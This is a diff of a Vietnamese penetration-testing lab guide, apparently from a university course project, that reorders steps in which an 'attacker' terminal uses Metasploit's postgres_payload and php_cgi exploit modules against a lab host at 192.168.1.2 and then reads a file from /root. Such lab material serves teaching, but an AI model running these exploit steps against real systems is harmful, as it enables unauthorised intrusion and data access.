@@ -155,6 +155,36 @@ sudo msfconsole
 ```
 Chờ chạy xong nhập:
 ```
+search postgres_payload
+```
+
+```
+use exploit/linux/postgres/postgres_payload
+```
+
+```
+set RHOST 192.168.1.2
+```
+
+```
+run
+```
+
+```
+cat /root/filetoview.txt
+```
+Nhập 2 lần lệnh sau:
+```
+exit
+```
+
+#### Bước 9:
+Trên terminal **`attacker`** nhập :
+```
+sudo msfconsole
+```
+Chờ chạy xong nhập:
+```
 search php_cgi
 ```
 
@@ -174,34 +204,6 @@ run
 cat /root/filetoview.txt
 ```
 (Nhấn Ctrl+C)
-
-#### Bước 9:
-Trên terminal **`attacker`** nhập :
-```
-sudo msfconsole
-```
-Chờ chạy xong nhập:
-```
-search postgres_payload
-```
-
-```
-use exploit/linux/postgres/postgres_payload
-```
-
-```
-set RHOST 192.168.1.2
-```
-
-```
-run
-```
-
-```
-cat /root/filetoview.txt
-```
-(Nhấn Ctrl+C)
-
 ## 📌 Bản quyền & Ghi công (Credits)
 
 * **Tác quyền:** Tài liệu và nội dung giải pháp này thuộc dự án **lazylab-ptit** (Biên soạn bởi **Mạc Rô Tích**).
